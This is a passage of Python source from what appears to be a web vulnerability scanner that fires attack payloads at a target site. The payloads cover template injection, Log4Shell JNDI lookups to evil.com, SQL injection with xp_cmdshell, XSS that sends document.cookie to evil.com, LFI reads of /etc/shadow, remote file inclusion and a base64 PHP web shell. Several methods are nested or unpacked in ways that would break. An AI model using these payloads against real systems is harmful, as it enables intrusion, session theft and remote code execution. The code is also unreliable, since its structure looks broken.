    API_PATHS: ClassVar[List[str]] = [
        "/api", "/api/v1", "/api/v2", "/api/v3",
        "/api/health", "/api/status", "/api/version", "/api/config",
        "/api/users", "/api/user", "/api/admin", "/api/auth",
        "/api/login", "/api/logout", "/api/register",
        "/api/token", "/api/refresh", "/api/verify",
        "/api/password/reset", "/api/password/change",
        "/api/search", "/api/query", "/api/filter",
        "/api/export", "/api/import", "/api/upload", "/api/download",
        "/api/notifications", "/api/messages", "/api/events",
        "/v1", "/v2", "/v3",
        "/api/rest", "/api/graphql", "/api/swagger",
        "/api/docs", "/api/openapi", "/api/schema",
        "/api/metadata", "/api/info", "/api/about",
        "/api/system", "/api/system/health",
        "/api/system/info", "/api/system/config",
        "/api/system/env", "/api/system/metrics",
        "/api/system/logs", "/api/system/threads",
        "/api/system/heapdump", "/api/system/threaddump",
        "/api/debug", "/api/trace", "/api/test",
        "/api/ping", "/api/echo", "/api/crash",
        "/api/admin/users", "/api/admin/roles",
        "/api/admin/permissions", "/api/admin/settings",
        "/api/internal", "/api/internal/health",
        "/api/internal/config", "/api/internal/status",
        "/api/private", "/api/private/health",
        "/api/private/config", "/api/private/status",
        "/api/external", "/api/external/webhook",
        "/api/external/callback", "/api/external/events",
        "/api/beta", "/api/beta/features",
        "/api/alpha", "/api/alpha/test",
        "/api/webhook", "/api/callback",
        "/api/hook", "/api/event",
        "/api/pubsub", "/api/queue",
        "/api/job", "/api/task",
        "/api/schedule", "/api/cron",
        "/api/backup", "/api/restore",
        "/api/report", "/api/analytics",
        "/api/dashboard", "/api/stats",
        "/api/metrics", "/api/monitor",
        "/api/alert", "/api/webhook/test",
        "/graphql", "/graphiql", "/graphql/console",
        "/v1/graphql", "/v2/graphql",
        "/api/graphql/batch", "/api/graphql/explore",
        "/swagger", "/swagger-ui", "/swagger-resources",
        "/swagger/v1/swagger.json", "/swagger/v2/swagger.json",
        "/api-docs", "/api-docs/v1", "/api-docs/v2",
        "/openapi.json", "/openapi.yaml",
        "/docs", "/docs/api",
        "/redoc", "/rapidoc",
        "/console", "/admin/console",
        "/actuator", "/actuator/health",
        "/actuator/info", "/actuator/env",
        "/actuator/beans", "/actuator/mappings",
        "/actuator/metrics", "/actuator/loggers",
        "/actuator/httptrace", "/actuator/threaddump",
        "/actuator/heapdump", "/actuator/conditions",
        "/actuator/configprops", "/actuator/auditevents",
        "/actuator/caches", "/actuator/health/{path}",
        "/actuator/integrationgraph", "/actuator/ liquibase",
        "/actuator/cloudfoundryapplication",
        "/.env", "/.env.production", "/.env.development",
        "/.env.local", "/.env.staging", "/.env.test",
        "/.git/config", "/.git/HEAD",
        "/sitemap.xml", "/robots.txt",
        "/security.txt", "/.well-known/security.txt",
    ]

    # ---- SSTI polyglot payloads for template injection detection ----
    SSTI_PAYLOADS: ClassVar[List[str]] = [
        "{{7*7}}",
        "${7*7}",
        "<%=7*7%>",
        "${{7*7}}",
        "#{7*7}",
        "*{7*7}",
        "{{7*'7'}}",
        "${7*'7'}",
        "{{config}}",
        "${config}",
        "{{self}}",
        "${self}",
        "{{_self}}",
        "{{_MSC}}",
        "{{_CLASS}}",
        "{{__class__}}",
        "{{__init__}}",
        "{{__globals__}}",
        "{{__builtins__}}",
        "{{''.__class__.__mro__}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{{lipsum.__globals__['os'].popen('id')}}",
        "{{lipsum.__globals__['__builtins__']['__import__']('os').popen('id')}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id')}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id')}}",
        "${7*7}",
        "${7*'7'}",
        "${class}",
        "${__class__}",
        "${__init__}",
        "${__globals__}",
        "${''.__class__.__mro__}",
        "${''.__class__.__mro__[1].__subclasses__()}",
        "${java:os}",
        "${jndi:ldap://evil.com/x}",
        "${jndi:dns://${hostName}.evil.com}",
        "${jndi:rmi://evil.com/x}",
        "${jndi:ldap://127.0.0.1:1389/x}",
        "<%=7*7%>",
        "<%=7*'7'%>",
        "<%= Class %>",
        "<%= java %>",
        "<%= Runtime %>",
        "<%= Runtime.getRuntime().exec('id') %>",
        "#{7*7}",
        "#{7*'7'}",
        "#{class}",
        "#{__class__}",
        "*{7*7}",
        "*{7*'7'}",
        "{{7*7}}",
        "{{7*7}}a",
        "a{{7*7}}",
        "{{7*7}}",
        "${7*7}",
        "{{7*7}}",
        "{{7*'7'}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{config.items()}}",
        "{{request}}",
        "{{session}}",
        "{{g}}",
        "{{app}}",
        "{{url_for}}",
        "{{get_flashed_messages}}",
        "${jndi:ldap://x}",
        "${jndi:rmi://x}",
        "${jndi:dns://x}",
        "${jndi:iiop://x}",
        "${jndi:corba://x}",
        "${jndi:ldaps://x}",
        "${jndi:http://x}",
        "<%= System.getProperty('user.dir') %>",
        "<%= java.lang.Runtime.getRuntime().exec('ls') %>",
        "#{7*7}",
        "*{7*7}",
        "${{7*7}}",
        "@@7*7@@",
    ]

    # ---- SSRF probing parameters to inject ----
    SSRF_PARAMETERS: ClassVar[List[str]] = [
        "url", "uri", "path", "dest", "destination", "redirect", "return",
        "return_to", "return_url", "next", "next_url", "redirect_uri",
        "redirect_url", "callback", "callback_url", "webhook", "hook",
        "image", "img", "src", "source", "load", "read", "file",
        "document", "page", "page_url", "folder", "root", "dir",
        "show", "view", "display", "download", "fetch", "post",
        "link", "href", "ref", "reference", "out", "output",
        "data", "rss", "xml", "import", "export", "submit",
        "host", "server", "addr", "address", "target", "domain",
        "site", "sites", "api", "endpoint", "proxy", "forward",
        "proxies", "location", "search", "query", "q", "s",
        "file_path", "filepath", "file_name", "filename", "attachment",
        "upload_url", "upload_path", "avatar", "profile_pic",
        "photo", "picture", "logo", "icon", "favicon", "banner",
        "cover", "background", "thumbnail", "preview",
        "video", "audio", "media_url", "stream_url",
        "manifest", "config_url", "config_file",
        "css_url", "js_url", "script_url", "import_url",
        "require", "include", "template", "theme",
        "style", "custom_css", "custom_js",
        "service_url", "service", "base_url", "base",
        "endpoint_url", "gateway", "broker",
        "rpc", "rest", "soap", "wsdl", "xmlrpc",
        "method", "action", "function", "func",
        "process", "execute", "run", "exec",
        "cmd", "command", "shell", "bash",
        "ping", "traceroute", "nslookup", "dig",
        "whois", "dns", "resolve",
        "test_url", "check_url", "verify_url",
        "validate", "verify", "confirm",
        "failure_url", "success_url", "cancel_url",
        "error_url", "error_page", "error_redirect",
        "logout_url", "login_url", "auth_url",
        "aws_url", "s3_url", "bucket_url",
        "azure_url", "gcp_url", "cloud_url",
        "internal_url", "external_url",
        "database_url", "db_url", "redis_url",
        "elastic_url", "mongo_url", "couch_url",
        "amqp_url", "rabbit_url", "kafka_url",
        "webhook_url", "callback_url_target",
        "notification_url", "alert_url",
        "slack_url", "teams_url", "discord_url",
        "github_url", "gitlab_url", "bitbucket_url",
        "jira_url", "confluence_url", "jenkins_url",
    ]

    # ---- CRLF / HTTP response splitting injection vectors ----
    CRLF_PAYLOADS: ClassVar[List[str]] = [
        "%0d%0a",
        "%0D%0A",
        "\r\n",
        "%0d%0aSet-Cookie:%20test=crlf",
        "%0d%0aX-Injected:%20true",
        "%0d%0aLocation:%20http://evil.com",
        "%0d%0aRefresh:%200;url=http://evil.com",
        "%0d%0aContent-Length:%200",
        "%0d%0a%0d%0a<html>injected</html>",
        "%0d%0a<script>alert(1)</script>",
        "%0d%0aLocation:%0d%0a%0d%0a<html>injected</html>",
        "%0a%0d",
        "%0aSet-Cookie:%20test=crlf",
        "%%0d0a",
        "%250d%250a",
        "%u000d%u000a",
        "%0d%0a%0d%0a",
        "\\r\\n",
        "\\r\\nX-Injected:true",
        "test%0d%0aX-Injected:%20true",
        "%0d%0aX-Forwarded-For:%20127.0.0.1",
        "%0d%0aX-Originating-IP:%20127.0.0.1",
        "%0d%0aX-Remote-IP:%20127.0.0.1",
        "%0d%0aX-Client-IP:%20127.0.0.1",
        "%0d%0aX-Host:%20127.0.0.1",
        "%0d%0aX-Forwarded-Host:%20127.0.0.1",
    ]

    # ---- CORS origin reflections to test ----
    CORS_ORIGINS: ClassVar[List[str]] = [
        "https://evil.com",
        "null",
        "https://{origin}.evil.com",
        "https://evil{origin}.com",
        "http://evil.com",
        "https://evil.com.evil.com",
        "https://evil.com:9999",
        "data:,foo",
        "https://{origin}.evil.com:9999",
        "file:///etc/passwd",
        "https://evil{origin}",
        "https://{origin}%40evil.com",
        "https://{origin}.evil.com/",
        "https://{origin}.evil.com.evil.com",
        "https://evil{origin}.com/",
        "https://{origin}@evil.com:9999",
        "https://{origin}.evil.com@evil.com",
        "https://evil{origin}.evil.com",
        "https://{origin}",
        "https://{origin}.com",
        "https://{origin}.net",
        "https://{origin}.org",
        "https://evil{origin}.net",
    ]

    # ---- Open redirect test payloads ----
    OPEN_REDIRECT_PAYLOADS: ClassVar[List[str]] = [
        "//evil.com",
        "//evil.com%2f@",
        "https://evil.com",
        "http://evil.com",
        "/\\evil.com",
        "//evil.com/",
        "/%09/evil.com",
        "/%5cevil.com",
        "%2f%2fevil.com",
        "http://evil.com%2f@",
        "/url=http://evil.com",
        "/redirect?url=http://evil.com",
        "javascript:alert(1)",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "///evil.com",
        "//evil.com:80",
        "//evil.com:443",
        "https://evil.com:443",
        "//evil%2ecom",
        "//evil。com",
        "//evil．com",
        "//evil｡com",
        r"\/\/evil.com",
        "/..;/evil.com",
        "/..%3B/evil.com",
        "http://127.0.0.1",
        "https://127.0.0.1",
        "http://localhost",
        "https://localhost",
        "http://0.0.0.0",
        "http://[::1]",
        "http://10.0.0.1",
        "http://172.16.0.1",
        "http://192.168.1.1",
        "/?redirect=https://evil.com",
        "/?url=https://evil.com",
        "/?next=https://evil.com",
        "/?return=https://evil.com",
    ]

    # ---- Cache poisoning headers to test ----
    CACHE_POISONING_HEADERS: ClassVar[List[str]] = [
        "X-Forwarded-Host",
        "X-Forwarded-Scheme",
        "X-Forwarded-Proto",
        "X-Forwarded-Port",
        "X-Forwarded-For",
        "X-Host",
        "X-Real-IP",
        "X-Original-URL",
        "X-Rewrite-URL",
        "X-HTTP-Method-Override",
        "X-HTTP-Method",
        "X-Method-Override",
        "X-Original-Host",
        "X-Backend-Host",
        "X-Backend-Server",
    ]

    # ---- IDOR / horizontal privilege escalation patterns ----
    IDOR_PATTERNS: ClassVar[List[Dict[str, Any]]] = [
        {"param": "id", "type": "integer", "range": (1, 100)},
        {"param": "user_id", "type": "integer", "range": (1, 100)},
        {"param": "uid", "type": "integer", "range": (1, 100)},
        {"param": "account_id", "type": "integer", "range": (1, 100)},
        {"param": "customer_id", "type": "integer", "range": (1, 100)},
        {"param": "profile_id", "type": "integer", "range": (1, 100)},
        {"param": "order_id", "type": "integer", "range": (1, 100)},
        {"param": "txn_id", "type": "integer", "range": (1, 100)},
        {"param": "transaction_id", "type": "integer", "range": (1, 100)},
        {"param": "document_id", "type": "integer", "range": (1, 100)},
        {"param": "file_id", "type": "integer", "range": (1, 100)},
        {"param": "invoice_id", "type": "integer", "range": (1, 100)},
        {"param": "ticket_id", "type": "integer", "range": (1, 100)},
        {"param": "msg_id", "type": "integer", "range": (1, 100)},
        {"param": "message_id", "type": "integer", "range": (1, 100)},
        {"param": "post_id", "type": "integer", "range": (1, 100)},
        {"param": "article_id", "type": "integer", "range": (1, 100)},
        {"param": "comment_id", "type": "integer", "range": (1, 100)},
        {"param": "uuid", "type": "uuid", "pattern": "00000000-0000-0000-0000-{random}"},
        {"param": "token", "type": "uuid", "pattern": "00000000-0000-0000-0000-{random}"},
        {"param": "reference", "type": "alphanumeric", "pattern": "REF{number:06d}"},
        {"param": "email", "type": "email", "pattern": "user{number}@example.com"},
    ]

    # ---- Cache test headers for cache deception ----
    CACHE_DECEPTION_EXTENSIONS: ClassVar[List[str]] = [
        ".css", ".js", ".png", ".jpg", ".gif", ".svg", ".ico",
        ".woff", ".woff2", ".ttf", ".eot", ".pdf", ".txt",
        ".xml", ".json", ".html", ".htm", ".xls", ".doc",
        ".ppt", ".mp4", ".webm", ".avi", ".mp3", ".wav",
    ]

    # ======================================================================
    #  WEB AUDIT ENGINE — MAIN EXECUTION
    # ======================================================================

    def run(self) -> List[Dict[str, Any]]:
        """
        Execute the full web application security audit:
        1. Sensitive path discovery
        2. Open redirect testing via known parameters
        3. CORS misconfiguration testing
        4. Error page analysis
        5. Sensitive data exposure checks
        6. Wayback Machine historical analysis
        7. JavaScript endpoint/secret extraction
        8. Subdomain takeover detection
        9. SSTI fuzzing on parameters
        10. SSRF parameter discovery
        11. CRLF injection testing
        12. API endpoint discovery
        13. JWT handling tests
        14. GraphQL introspection & depth testing
        15. Directory fuzzing with tech-aware wordlists
        """
        self.logger.info(f"Starting full web audit for {self.target}")

        phase_methods = [
            ("Sensitive Path Discovery", self._scan_sensitive_paths),
            ("Open Redirect Testing", self._test_open_redirects),
            ("CORS Misconfiguration", self._test_cors),
            ("Error Page Analysis", self._analyze_error_pages),
            ("Sensitive Data Exposure", self._check_sensitive_exposure),
            ("Wayback Machine Analysis", self._wayback_analysis),
            ("JavaScript Analysis & Secrets", self._analyze_js_secrets),
            ("Subdomain Takeover Detection", self._detect_takeovers),
            ("SSTI Fuzzing", self._fuzz_ssti),
            ("SSRF Parameter Discovery", self._discover_ssrf_params),
            ("CRLF Injection Testing", self._test_crlf_injection),
            ("API Endpoint Discovery", self._discover_api_endpoints),
            ("JWT Handling Tests", self._test_jwt_handling),
            ("GraphQL Testing", self._test_graphql),
            ("Directory Fuzzing", self._fuzz_directories),
        ]

        with ThreadPoolExecutor(max_workers=min(Config.THREADS, 10)) as executor:
            futures = {}
            for phase_name, phase_func in phase_methods:
                self.logger.info(f"Starting phase: {phase_name}")
                futures[executor.submit(self._run_phase_safe, phase_name, phase_func)] = phase_name

            for future in as_completed(futures):
                phase_name = futures[future]
                try:
                    result = future.result()
                    if result:
                        self.findings.extend(result)
                except Exception as e:
                    self.logger.error(f"Phase '{phase_name}' failed: {e}")

        self.logger.info(f"Web audit complete: {len(self.findings)} findings")
        return self.findings

    def _run_phase_safe(self, phase_name: str, phase_func) -> List[Dict[str, Any]]:
        """Safely execute an audit phase with error handling."""
        try:
            self.logger.info(f"Executing audit phase: {phase_name}")
            result = phase_func()
            self.logger.info(f"Phase '{phase_name}' completed with {len(result) if result else 0} findings")
            return result or []
        except Exception as e:
            self.logger.error(f"Error in phase '{phase_name}': {e}", exc_info=True)
            return [{
                "type": "audit_error",
                "phase": phase_name,
                "severity": "info",
                "detail": f"Phase failed: {str(e)}",
                "endpoint": self.target,
            }]

    def _scan_sensitive_paths(self) -> List[Dict[str, Any]]:
        """Scan for sensitive files and directories."""
        findings = []
        discovered = []

        def check_path(path: str):
            try:
                url = urljoin(self.base_url, path)
                resp = Utils.get(self.session, url, timeout=Config.TIMEOUT)
                if resp and resp.status_code not in [404, 403, 400, 410, 451]:
                    content_type = resp.headers.get("Content-Type", "")
                    content_length = len(resp.content) if resp.content else 0
                    return {
                        "path": path,
                        "url": url,
                        "status": resp.status_code,
                        "content_type": content_type,
                        "content_length": content_length,
                        "headers": dict(resp.headers),
                    }
            except:
                pass
            return None

        # Batch sensitive path checks
        batches = Utils.chunk_list(self.SENSITIVE_PATHS, 20)
        for batch in batches:
            with ThreadPoolExecutor(max_workers=10) as executor:
                results = list(executor.map(check_path, batch))
            discovered.extend([r for r in results if r])

        if discovered:
            for path, status in discovered[:50]:
                result = {
                    "type": "sensitive_path",
                    "path": path,
                    "status": status,
                    "severity": "medium" if status == 200 else "low",
                    "description": f"Exposed sensitive path: {path} (HTTP {status})"
                }
                self.findings.append(result)
                
                # Auto-classify false positives
                if self.false_positives and any(fp in path.lower() for fp in self.false_positives):
                    result["false_positive"] = True
                    result["severity"] = "info"
            
            return self.findings

        def _check_sql_injection(self, url):
            """Test for SQL injection vulnerabilities."""
            sqli_payloads = [
                "'", "''", "`", "`)", "')", "\"", "\"\"",
                "' OR '1'='1", "' OR 1=1--", "' OR '1'='1'--",
                "\" OR \"1\"=\"1", "\" OR 1=1--",
                "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
                "1' UNION SELECT 1--", "1' UNION SELECT 1,2--", "1' UNION SELECT 1,2,3--",
                "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
                "'; WAITFOR DELAY '0:0:5'--", "1' AND SLEEP(5)--",
                "' AND 1=CONVERT(INT, @@version)--",
                "admin'--", "admin' #", "admin'/*",
                "' OR '1'='1' /*", "' OR '1'='1' #",
                "'; EXEC xp_cmdshell('whoami')--",
                "' UNION SELECT @@version,1,2--",
                "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
                "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            ]
            
            test_params = ["id", "page", "pid", "cat", "category", "user", "username", 
                          "name", "search", "q", "query", "s", "sort", "order", "file",
                          "edit", "delete", "view", "action", "token", "lang", "ref"]
            
            results = []
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            # Test URL parameters if any
            if parsed.query:
                params = dict(parse_qs(parsed.query))
                for param in params:
                    original_value = params[param][0]
                    for payload in sqli_payloads[:15]:  # Test first 15 payloads per param
                        test_params_dict = {k: v[0] for k, v in params.items()}
                        test_params_dict[param] = payload
                        test_url = f"{base_url}?{urlencode(test_params_dict)}"
                        
                        try:
                            resp = self.session.get(test_url, timeout=10, allow_redirects=False)
                            
                            # Detect SQLi via error messages
                            error_indicators = [
                                "sql", "mysql", "syntax error", "unclosed quotation",
                                "odbc", "driver", "sqlite", "postgresql", "oracle",
                                "you have an error", "warning: mysql", "division by zero",
                                "unknown column", "from information_schema", "pg_sleep",
                                "waitfor delay", "convert(int", "@@version"
                            ]
                            
                            body_lower = resp.text.lower()
                            timing_diff = 0
                            
                            if "SLEEP" in payload or "WAITFOR" in payload or "DELAY" in payload:
                                start = time.time()
                                resp = self.session.get(test_url, timeout=15)
                                timing_diff = time.time() - start
                            
                            detected = any(indicator in body_lower for indicator in error_indicators)
                            time_based = timing_diff > 4.5
                            
                            if detected or time_based:
                                result = {
                                    "type": "sql_injection",
                                    "url": test_url,
                                    "parameter": param,
                                    "payload": payload,
                                    "detection": "error_based" if detected else "time_based",
                                    "severity": "critical",
                                    "description": f"SQL Injection in parameter '{param}' using payload: {payload}"
                                }
                                results.append(result)
                                self.findings.append(result)
                        except Exception:
                            pass
            else:
                # Test common parameters on the path
                for param in test_params[:8]:
                    for payload in sqli_payloads[:8]:
                        test_url = f"{base_url}?{param}={urlencode(payload)}"
                        try:
                            resp = self.session.get(test_url, timeout=10)
                            body_lower = resp.text.lower()
                            
                            if any(indicator in body_lower for indicator in [
                                "sql", "mysql", "syntax error", "unclosed quotation",
                                "odbc", "driver", "sqlite", "postgresql",
                                "you have an error", "warning: mysql", "division by zero",
                                "unknown column", "from information_schema"
                            ]):
                                result = {
                                    "type": "sql_injection",
                                    "url": test_url,
                                    "parameter": param,
                                    "payload": payload,
                                    "detection": "error_based",
                                    "severity": "critical",
                                    "description": f"SQL Injection in parameter '{param}' using payload: {payload}"
                                }
                                results.append(result)
                                self.findings.append(result)
                        except:
                            pass
            
            # POST-based SQLi
            for param in test_params[:5]:
                for payload in sqli_payloads[:8]:
                    try:
                        resp = self.session.post(base_url, data={param: payload}, timeout=10)
                        body_lower = resp.text.lower()
                        if any(indicator in body_lower for indicator in [
                            "sql", "mysql", "syntax error", "unclosed quotation",
                            "odbc", "driver", "sqlite", "pg_sleep"
                        ]):
                            result = {
                                "type": "sql_injection_post",
                                "url": base_url,
                                "parameter": param,
                                "payload": payload,
                                "detection": "post_based",
                                "severity": "critical",
                                "description": f"SQL Injection (POST) in parameter '{param}' using payload: {payload}"
                            }
                            results.append(result)
                            self.findings.append(result)
                    except:
                        pass
            
            return results

        def _check_xss(self, url):
            """Test for Cross-Site Scripting vulnerabilities."""
            xss_payloads = [
                "<script>alert(1)</script>",
                "<ScRiPt>alert(1)</ScRiPt>",
                "<script>alert(document.cookie)</script>",
                "<img src=x onerror=alert(1)>",
                "<img src=x onerror=alert(document.cookie)>",
                "<svg/onload=alert(1)>",
                "<svg/onload=alert(document.cookie)>",
                "javascript:alert(1)",
                "\"><script>alert(1)</script>",
                "'><script>alert(1)</script>",
                "'';!--\"<XSS>=&{()}",
                "<SCRIPT>alert('XSS')</SCRIPT>",
                "<BODY ONLOAD=alert(1)>",
                "<INPUT TYPE=\"BUTTON\" ONCLICK=\"alert(1)\">",
                "<a onmouseover=alert(1)>click</a>",
                "';alert(1);//",
                "\"-alert(1)-\"",
                "{{constructor.constructor('alert(1)')()}}",  # Angular/Vue SSTI-like
                "<script>fetch('https://evil.com/'+document.cookie)</script>",
                "<img src=x onerror=\"fetch('https://evil.com/'+btoa(document.cookie))\">",
            ]
            
            results = []
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            test_params = ["q", "search", "query", "s", "name", "user", "username",
                          "comment", "message", "title", "text", "feedback", "email",
                          "firstname", "lastname", "subject", "address", "city", "state"]
            
            if parsed.query:
                params = dict(parse_qs(parsed.query))
                for param in params:
                    for payload in xss_payloads[:10]:
                        test_params_dict = {k: v[0] for k, v in params.items()}
                        test_params_dict[param] = payload
                        test_url = f"{base_url}?{urlencode(test_params_dict)}"
                        
                        try:
                            resp = self.session.get(test_url, timeout=10)
                            # Check if payload is reflected
                            if payload in resp.text or payload.lower() in resp.text.lower():
                                # Check for sanitization
                                sanitized = (
                                    f"&lt;{payload[1:]}" in resp.text or
                                    f"&gt;{payload[1:]}" in resp.text or
                                    f"&#x3C;{payload[1:]}" in resp.text
                                )
                                if not sanitized:
                                    # Determine context
                                    context = "unknown"
                                    if f">{payload}" in resp.text or f"'{payload}" in resp.text or f'"{payload}' in resp.text:
                                        context = "attribute"
                                    elif payload in resp.text:
                                        context = "html"
                                    
                                    result = {
                                        "type": "reflected_xss",
                                        "url": test_url,
                                        "parameter": param,
                                        "payload": payload,
                                        "context": context,
                                        "severity": "critical",
                                        "description": f"Reflected XSS in parameter '{param}' (context: {context})"
                                    }
                                    results.append(result)
                                    self.findings.append(result)
                        except:
                            pass
            
            # POST-based XSS
            for param in test_params[:8]:
                for payload in xss_payloads[:5]:
                    try:
                        resp = self.session.post(base_url, data={param: payload}, timeout=10)
                        if payload in resp.text or payload.lower() in resp.text.lower():
                            sanitized = (
                                f"&lt;{payload[1:]}" in resp.text or
                                f"&gt;{payload[1:]}" in resp.text
                            )
                            if not sanitized:
                                result = {
                                    "type": "stored_xss",
                                    "url": base_url,
                                    "parameter": param,
                                    "payload": payload,
                                    "severity": "critical",
                                    "description": f"Possible Stored XSS in parameter '{param}'"
                                }
                                results.append(result)
                                self.findings.append(result)
                    except:
                        pass
            
            return results

        def _check_lfi_rfi(self, url):
            """Test for Local/Remote File Inclusion."""
            lfi_payloads = [
                "/etc/passwd",
                "/etc/shadow",
                "/etc/hosts",
                "/etc/issue",
                "/etc/group",
                "/proc/self/environ",
                "/proc/self/cmdline",
                "/proc/version",
                "/etc/apache2/apache2.conf",
                "/etc/nginx/nginx.conf",
                "/etc/httpd/conf/httpd.conf",
                "/var/log/apache2/access.log",
                "/var/log/nginx/access.log",
                "C:\\Windows\\system32\\drivers\\etc\\hosts",
                "C:\\Windows\\win.ini",
                "C:\\Windows\\system32\\config\\SAM",
                "php://filter/convert.base64-encode/resource=index.php",
                "php://filter/convert.base64-encode/resource=config.php",
                "php://filter/convert.base64-encode/resource=/etc/passwd",
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
                "expect://id",
                "file:///etc/passwd",
            ]
            
            rfi_payloads = [
                "http://evil.com/shell.txt?",
                "http://attacker.com/evil.php?",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
            ]
            
            results = []
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            test_params = ["file", "page", "pg", "include", "path", "doc", "document",
                          "folder", "root", "load", "read", "dir", "show", "view",
                          "content", "template", "default", "site", "style", "pdf",
                          "language", "lang", "cfg", "conf", "config"]
            
            if parsed.query:
                params = dict(parse_qs(parsed.query))
                for param in params:
                    # LFI tests
                    for payload in lfi_payloads:
                        test_params_dict = {k: v[0] for k, v in params.items()}
                        test_params_dict[param] = payload
                        test_url = f"{base_url}?{urlencode(test_params_dict)}"
                        
                        try:
                            resp = self.session.get(test_url, timeout=10)
                            body_lower = resp.text.lower()
                            
                            lfi_indicators = [
                                "root:", "daemon:", "bin:", "sys:", "nobody:",
                                "www-data:", "www-data", "apache", "nginx",
                                "uid=", "gid=", "Microsoft Windows",
                                "php://", "allow_url_include",
                                "<?php", "mysql_connect", "mysqli_connect",
                                "driver=", "server=", "database=",
                            ]
                            
                            if any(indicator in body_lower for indicator in lfi_indicators):
                                result = {
                                    "type": "lfi",
                                    "url": test_url,
                                    "parameter": param,
                                    "payload": payload,
                                    "severity": "critical",
                                    "description": f"Local File Inclusion in parameter '{param}'"
                                }
                                results.append(result)
                                self.findings.append(result)
                        except:
                            pass
                    
                    # RFI tests
                    for payload in rfi_payloads:
                        test_params_dict = {k: v[0] for k, v in params.items()}
                        test_params_dict[param] = payload
                        test_url = f"{base_url}?{urlencode(test_params_dict)}"
                        
                        try:
                            resp = self.session.get(test_url, timeout=10, allow_redirects=False)
                            # If the URL was included (remote), we'd get a different response
                            if resp.status_code == 200 and len(resp.text) > 0:
                                # Attempted RFI indicator
                                if "PHP" in resp.text or "eval" in resp.text.lower():
                                    result = {
                                        "type": "rfi",
                                        "url": test_url,
                                        "parameter": param,
                                        "payload": payload,
                                        "severity": "critical",
                                        "description": f"Possible Remote File Inclusion in parameter '{param}'"
                                    }
                                    results.append(result)
                                    self.findings.append(result)
                        except:
                            pass
            
            return results

        def _check_command_injection(self, url):
            """Test for OS Command Injection."""
            cmdi_payloads = [
                ("semicolon", "; id", "uid="),
                ("pipe", "| id", "uid="),
                ("and", "&& id", "uid="),
                ("or", "|| id", "uid="),
                ("subshell", "$(id)", "uid="),
                ("backtick", "`id`", "uid="),
                ("newline", "%0Aid", "uid="),
                ("semicolon_windows", "; whoami", "nt authority"),
                ("pipe_windows", "| whoami", "nt authority"),
                ("ping_unix", "; ping -c 5 127.0.0.1", ""),
                ("ping_windows", "& ping -n 5 127.0.0.1", ""),
                ("sleep_unix", "; sleep 5", ""),
                ("sleep_windows", "& timeout 5", ""),
            ]
            
            results = []
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            test_params = ["cmd", "command", "exec", "execute", "run", "ping", "traceroute",
                          "nslookup", "host", "whois", "dig", "ip", "server", "domain",
                          "hostname", "target", "destination", "addr", "address", "url"]
            
            if parsed.query:
                params = dict(parse_qs(parsed.query))
                for param in params:
                    for technique, payload, indicator in cmdi_payloads:
                        test_params_dict = {k: v[0] for k, v in params.items()}
                        test_params_dict[param] = payload
                        test_url = f"{base_url}?{urlencode(test_params_dict)}"
                        
                        try:
                            start = time.time()
                            resp = self.session.get(test_url, timeout=15)
                            elapsed = time.time() - start
                            body_lower = resp.text.lower()
                            
                            # Time-based detection
                            time_based = ("sleep" in payload or "ping" in payload or "timeout" in payload) and elapsed > 4.5
                            
                            # Output-based detection
                            output_detected = indicator in body_lower if indicator else False
                            
                            # Error-based detection
                            error_detected = any(err in body_lower for err in [
                                "command not found", "not recognized", "syntax error",
                                "output:", "binary file", "cannot execute"
                            ])
                            
                            if time_based or output_detected or error_detected:
                                result = {
                                    "type": "command_injection",
                                    "url": test_url,
                                    "parameter": param,
                                    "technique": technique,
                                    "payload": payload,
                                    "detection": "time_based" if time_based else "output_based" if output_detected else "error_based",
                                    "severity": "critical",
                                    "description": f"Command Injection ({technique}) in parameter '{param}'"
                                }
                                results.append(result)
                                self.findings.append(result)
                        except:
                            pass
            
            return results

        def _check_csrf(self, url):
            """Check for CSRF vulnerabilities by analyzing forms."""
            results = []
            
            try:
                resp = self.session.get(url, timeout=10)
                soup = BeautifulSoup(resp.text, 'html.parser')
                forms = soup.find_all('form')
                
                for form in forms:
                    form_action = form.get('action', url)
                    form_method = form.get('method', 'get').upper()
                    
                    # Resolve relative URL
                    if not form_action.startswith('http'):
                        form_action = urljoin(url, form_action)
                    
                    inputs = form.find_all('input')
                    has_csrf_token = False
                    
                    for input_tag in inputs:
                        input_name = input_tag.get('name', '')
                        input_type = input_tag.get('type', '')
                        
                        csrf_indicators = [
                            'csrf', 'token', '_token', 'csrf_token', 'csrfmiddlewaretoken',
                            '__csrf', 'xsrf', 'authenticity_token', 'csrf-token',
                            'csrfmiddleware', 'nonce', 'state'
                        ]
                        
                        if any(indicator in input_name.lower() for indicator in csrf_indicators):
                            # Check if it's actually a hidden field with a value
                            if input_type == 'hidden' and input_tag.get('value'):
                                has_csrf_token = True
                            elif input_tag.get('value') and len(input_tag.get('value')) > 8:
                                has_csrf_token = True
                    
                    if not has_csrf_token and form_method == 'POST':
                        result = {
                            "type": "csrf",
                            "url": form_action,
                            "method": form_method,
                            "severity": "high",
                            "description": f"CSRF vulnerability: No CSRF token found in form at {form_action}"
                        }
                        results.append(result)
                        self.findings.append(result)
                        
            except:
                pass
            
            return results

        def _check_ssrf(self, url):
            """Test for Server-Side Request Forgery."""
            ssrf_callback_urls = [
                "http://169.254.169.254/latest/meta-data/",           # AWS
                "http://169.254.169.254/latest/user-data/",
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01", # Azure
